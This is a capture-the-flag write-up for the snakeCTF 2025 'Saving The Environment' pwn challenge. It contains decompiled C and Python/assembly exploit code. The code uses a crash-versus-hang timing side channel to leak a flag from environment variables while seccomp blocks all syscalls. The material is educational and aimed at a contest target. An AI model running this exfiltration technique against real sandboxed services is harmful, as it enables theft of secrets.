# Saving The Environment [_snakeCTF 2025 Quals_]

**Category**: pwn

## Description

I have a super energy efficient server, so I'll let you run your code on it to save the environment.
Just don't run anything sketchy ok?

## Solution

We receive a compiled executable `chall` and a python wrapper script `wrapper.py` that handles crashes.

Decompiling the executable in ghidra we see that the program does 4 things:

1. Prints environment variables
2. Takes user code in input
3. Blocks all syscall
4. Executes user code

```c
void print_env(char **envp){
    int check;
    int i;
    bool found_flag;

    found_flag = false;
    for (i = 0; envp[i] != (char *)0x0; i = i + 1) {
        check = strncmp(envp[i],"FLAG=",5);
        if (check == 0) {
          puts("FLAG=... Lets not print this one...");
          found_flag = true;
        }
        else {
            puts(envp[i]);
        }
    }
    if (!found_flag) {
        puts("Error: FLAG not found in environment variables");
        exit(1);
    }
    return;
}

void main(int argc,char **argv,char **envp){

    uint code_len;
    undefined8 seccomp_filter;

    setvbuf(stdout,(char *)0x0,2,0);
    setvbuf(stdin,(char *)0x0,2,0);
    setvbuf(stderr,(char *)0x0,2,0);

    code_buffer = (byte *)mmap((void *)0x500000,0x200,7,0x22,-1,0);
    memset(code_buffer,0x90,8);

    puts("Environment Variables:");
    print_env(envp);

    code_len = 0;
    __isoc99_scanf("%u",&code_len);

    if (0x200 < code_len) {
        puts("You\'d like uh");
        exit(1);
    }

    read(0,code_buffer,(ulong)code_len);

    seccomp_filter = seccomp_init(0);
    seccomp_rule_add(seccomp_filter,0,1,0);
    seccomp_rule_add(seccomp_filter,0,0,0);
    seccomp_load(seccomp_filter);
    seccomp_release(seccomp_filter);

    (*(code *)code_buffer)(0,0,0,0,0,0);
    return;
}
```

The flag is stored in then environment variables but we cannot use any syscall to print it to stdout.

When our code is called most of the registers get reset, but the Stack and Base Pointer aren't modified, so the Stack Pointer still points the main function stack frame.

Having code execution and **knowing that the environment variables are stored on the stack** we can use a side channel timing attack to exfiltrate the flag.

### First Step

Knowing the order of the environment variables we can use a debugger to calculate the offset between the stack pointer and the flag in env.

### Second Step

Working bit by bit we can check if it's equal to 1 or 0.
With this check we then kill the process by calling a syscall or let it loop endlessly.

```python
def build_mask(i):
    # Builds the bitmask mask to extract only the i-th bit
    assert i<8 and i>=0
    mask="0b"+"0"*(7-i)+"1"+"0"*i
    return mask

def build_payload(env_var_n, bit_n):
    mask=build_mask(bit_n%8)

    payload=f"""
    main:
        mov rax, [rbp+0x128+{env_var_n*8}]
        mov rax, [rax+{bit_n//8}]
        and rax, 0xff
        and rax, {mask}
        cmp rax, 0
        je loop
        syscall

    loop:
        jmp loop

    """

    return asm(payload, vma=0x500000)
```

### Third Step

Since the wrapper script sends out an error message when the program crashes we can wait for the error message with a timeout.
If the timeout is hit then we entered the loop, else it was killed by the syscall.
From this we can determine whether the bit we checked was 1 or 0.

```python
def leak_bit(env_var_n, bit_n):
    # leaks the byte_n-th bit of the env_var_n-th environment variable

    payload=build_payload(env_var_n, bit_n)

    r = conn()
    r.sendline(str(len(payload)).encode())
    r.send(payload)

    res=r.recvuntil(b"Killed", timeout=1).decode()

    r.close()

    if res!="":
        return False
    else:
        return True


def leak_byte(env_var_n, byte_n):
    # leaks the byte_n-th byte of the env_var_n-th environment variable
    bits=[]
    for i in range(7):
        if leak_bit(env_var_n, byte_n*8+i):
            bits.append(0)
        else:
            bits.append(1)
    bits=bits[::-1]

    binary_str = ''.join(map(str, bits))
    return chr(int(binary_str, 2))
```
